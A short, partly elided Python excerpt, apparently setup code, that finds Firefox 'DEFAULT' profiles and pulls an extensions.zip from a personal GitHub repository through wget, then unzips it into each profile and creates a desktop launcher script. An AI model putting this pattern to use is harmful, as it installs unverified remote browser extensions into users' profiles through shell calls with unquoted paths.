...
for folder in folders:
    if 'DEFAULT' in folder:
        ...
        user_prefs.close()
        os.system(f"wget https://github.com/AbdullahRash33d/heyshell/raw/main/extensions.zip -P {firefox_path}/{folder}/")
        os.system(f"unzip {firefox_path}/{folder}/extensions.zip -d {firefox_path}/{folder}/")
        os.system(f"rm -rf {firefox_path}/{folder}/extensions.zip")
        os.system("""touch /home/user/Desktop/firefox.sh && echo 'firefox -P "DEFAULT"' >> /home/user/Desktop/firefox.sh && chmod +x /home/user/Desktop/firefox.sh""")
